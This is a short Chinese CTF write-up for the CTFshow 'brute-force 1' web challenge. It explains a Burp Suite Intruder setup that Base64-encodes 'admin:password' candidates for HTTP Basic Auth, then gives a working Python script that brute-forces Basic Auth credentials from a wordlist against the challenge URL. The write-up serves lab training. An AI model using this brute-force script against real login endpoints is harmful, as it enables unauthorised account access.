## CTFshow web入门——爆破

[TOC]

### 爆破-1

#### 方法一

给了一个密码fuzz，使用bp抓包，发送爆破

- Payload类型：自定义迭代器

1. 在模块one中添加`admin`

2. 在模块two中添加`:`

3. 在模块Three中添加----fuzz文件

payload处理----添加`Base64-encode`

同时取消-----url编码

- 常规模式 

1. 添加前缀`admin:`
2. 编码`base64-encode`

#### 方法二---使用python脚本

```python
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-11-20 19:16:49
# @Last Modified by:   h1xa
# @Last Modified time: 2020-11-20 20:28:42
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

import time
import requests
import base64

url = 'http://41a801fe-a420-47bc-8593-65c3f26b7efa.chall.ctf.show/index.php'
# URL换成实际的靶场网址

password = []

# 使用字典
with open("1.txt", "r") as f:  
	while True:
	    data = f.readline() 
	    if data:
	    	password.append(data)
	    else:
	      break
	    


for p in password:
	strs = 'admin:'+ p[:-1]
	header={
		'Authorization':'Basic {}'.format(base64.b64encode(strs.encode('utf-8')).decode('utf-8'))
	}
	rep =requests.get(url,headers=header)
	time.sleep(0.2)
	if rep.status_code ==200:
		print(rep.text)
		break
```



### 爆破-2



